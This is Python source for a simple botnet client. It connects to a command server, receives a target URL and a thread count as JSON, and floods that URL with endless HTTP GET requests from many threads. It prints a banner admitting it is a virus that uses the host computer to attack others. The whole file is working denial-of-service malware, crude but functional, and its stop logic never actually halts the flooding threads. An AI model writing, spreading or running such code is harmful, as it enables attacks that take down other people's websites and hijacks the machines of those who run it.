import socket
import json
import threading
import requests

PORT = 11023
HOST = "127.0.0.1"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print(f"""Welcome to the botnet! You are connected to {HOST}:{PORT}. 
WARNING: THIS IS A VIRUS
Your computer's rescources are now used to attack other computers. 
If you do not consent to such happening, shut down your computer and contact somebody 
who understands computers better to remove this piece of malware from your device!""")

META = json.loads(s.recv(1024).decode())
url = META["META"]["sitename"]
action = META["META"]["action"]
threadcount = META["META"]["threads"]

def reqsend():
    while True:
        try:
            requests.get(url)
        except Exception as e:
            print(e)
            s.send(b"INVALIDURL")
            break

for x in range(int(threadcount)):
    thread = threading.Thread(target=reqsend, args=())
    thread.start()

while True:
    META = json.loads(s.recv(1024).decode())
    action = META["META"]["action"]
    if action == "stop":
        break
    else:

        break



